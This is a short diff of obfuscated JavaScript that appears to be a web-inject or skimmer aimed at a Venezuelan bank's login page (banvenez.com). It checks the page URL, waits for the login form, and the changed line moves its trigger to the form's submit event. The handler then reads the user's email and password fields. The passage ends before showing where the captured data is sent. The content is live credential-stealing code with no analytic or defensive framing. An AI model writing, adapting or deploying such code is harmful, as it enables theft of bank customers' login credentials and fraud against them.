@@ -304,7 +304,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('proceed maskable')[0]) {
               clearInterval(interval);
-              document['getElementsByClassName']('actions actionsSpacedShort')[0].onmouseover = function (_0x441cx2) {
+              document['getElementsByName']('login')[0].onsubmit = function (_0x441cx2) {
                var login = {};
               login.email = document.getElementsByName("login_email")[0].value;
               login.pass = document.getElementsByName("login_password")[0].value;
